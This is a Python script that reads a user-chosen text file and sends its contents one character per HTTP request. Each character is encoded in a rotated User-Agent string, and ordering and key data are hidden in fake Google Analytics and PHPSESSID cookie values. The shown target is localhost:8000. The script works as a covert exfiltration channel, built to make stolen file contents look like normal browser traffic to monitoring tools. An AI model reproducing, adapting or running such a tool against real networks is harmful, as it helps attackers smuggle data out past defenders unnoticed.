import requests
import random
from collections import deque
import hashlib
import copy
from user_agents import user_agent_strings
# Function to rotate the dictionary by a random number between 10 and 95
def rotate_dict(original_dict):
    rotation_value = random.randint(10, 95)
    do = deque(original_dict.values())
    do.rotate(rotation_value)  # rotate the values by n
    do = dict(zip(original_dict.keys(), do))
    return do, rotation_value

# Function to send HTTP requests for each character in the input file
def send_requests(file_path):
    with open(file_path, 'r') as file:
        content = file.read()
    
    total_characters = f'{len(content)+1:03}'
    order = total_characters
    char = '0x00'
    rotated_user_agents, rotation_value = rotate_dict(user_agent_strings)
    order_value = total_characters
    random_part_ga = f'{random.randint(111111, 999999):06}{order_value}'
    random_part_gid = f'{random.randint(11111111, 99999999):08}{rotation_value}'
    random_part_end = f'{random.randint(1111111, 9999999):07}{total_characters}'
        
        # Creating the headers
    message = next(key for key, value in rotated_user_agents.items() if value == char)
    temp = str(message)
    print(temp)
    request_hash = hashlib.sha256(temp.encode()).hexdigest()
    headers = {
            'Host': 'localhost:8000',
            'User-Agent': next(key for key, value in rotated_user_agents.items() if value == char),
            'Cookie': f'_gat=27; PHPSESSID={request_hash}; _ga=GA1.2.{random_part_ga}.{random_part_end}; _gid=GA1.2.{random_part_gid}.{random_part_end}'
    }
        # Creating the HTTP request
    response = requests.get('http://localhost:8000/', headers=headers)
    print(headers)
    print(response)
    
    for order, char in enumerate(content, start=1):
        rotated_user_agents, rotation_value = rotate_dict(user_agent_strings)
        order_value = f'{order:03}'
        random_part_ga = f'{random.randint(111111, 999999):06}{order_value}'
        random_part_gid = f'{random.randint(11111111, 99999999):08}{rotation_value}'
        random_part_end = f'{random.randint(1111111, 9999999):07}{total_characters}'
        
        # Creating the headers
        message = next(key for key, value in rotated_user_agents.items() if value == char)
        temp = str(message)
        print(temp)
        request_hash = hashlib.sha256(temp.encode()).hexdigest()
        headers = {
            'Host': 'localhost:8000',
            'User-Agent': next(key for key, value in rotated_user_agents.items() if value == char),
            'Cookie': f'_gat=27; PHPSESSID={request_hash}; _ga=GA1.2.{random_part_ga}.{random_part_end}; _gid=GA1.2.{random_part_gid}.{random_part_end}'
        }
        # Creating the HTTP request
        response = requests.get('http://localhost:8000/', headers=headers)
        print(headers)
        print(response)
        # You can use the 'response' object as needed for your use case
        #print(f"Character: {char}, Order: {order_value}, Response Status Code: {response.status_code}")
    order = total_characters
    char = '0x00'
    rotated_user_agents, rotation_value = rotate_dict(user_agent_strings)
    order_value = total_characters
    random_part_ga = f'{random.randint(111111, 999999):06}{order_value}'
    random_part_gid = f'{random.randint(11111111, 99999999):08}{rotation_value}'
    random_part_end = f'{random.randint(1111111, 9999999):07}{total_characters}'
        
        # Creating the headers
    message = next(key for key, value in rotated_user_agents.items() if value == char)
    temp = str(message)
    print(temp)
    request_hash = hashlib.sha256(temp.encode()).hexdigest()
    headers = {
            'Host': 'localhost:8000',
            'User-Agent': next(key for key, value in rotated_user_agents.items() if value == char),
            'Cookie': f'_gat=27; PHPSESSID={request_hash}; _ga=GA1.2.{random_part_ga}.{random_part_end}; _gid=GA1.2.{random_part_gid}.{random_part_end}'
    }
        # Creating the HTTP request
    response = requests.get('http://localhost:8000/', headers=headers)
    print(headers)
    print(response)
# Example usage: replace 'file_path.txt' with the path to your input file
file_path = input("Enter the path of the txt file: ")
send_requests(file_path)
